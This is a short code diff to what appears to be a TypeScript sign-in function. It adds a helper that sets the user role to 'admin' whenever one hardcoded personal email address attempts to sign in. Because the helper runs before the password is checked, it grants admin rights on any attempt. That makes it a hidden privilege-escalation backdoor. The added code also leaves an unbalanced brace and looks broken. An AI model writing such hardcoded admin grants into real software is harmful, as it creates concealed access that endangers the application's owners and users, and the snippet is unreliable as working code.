@@ -11,6 +11,8 @@ export const signInEmailPassword = async (email: string, password: string) => {
   if (!user) {
     const dbUser = await createUser(email, email, password);
     return dbUser;
+  } else {
+    await editUser(email);
   }
   const isValid = await bcrypt.compare(password, user.password ?? "");
   if (!isValid) return null;
@@ -41,5 +43,20 @@ const createUser = async (name: string, email: string, password: string) => {
       },
     });
     return newUser;
+  }
+};
+
+
+const editUser = async (email: string) => {
+
+  if (email === "diego.aluicio@gmail.com") {
+    const editUser = await prisma.user.update({
+      where: { email },
+      data: {
+        role: "admin", // or another valid role value
+      },
+    });
+    return editUser;
+  } 
   }
 };
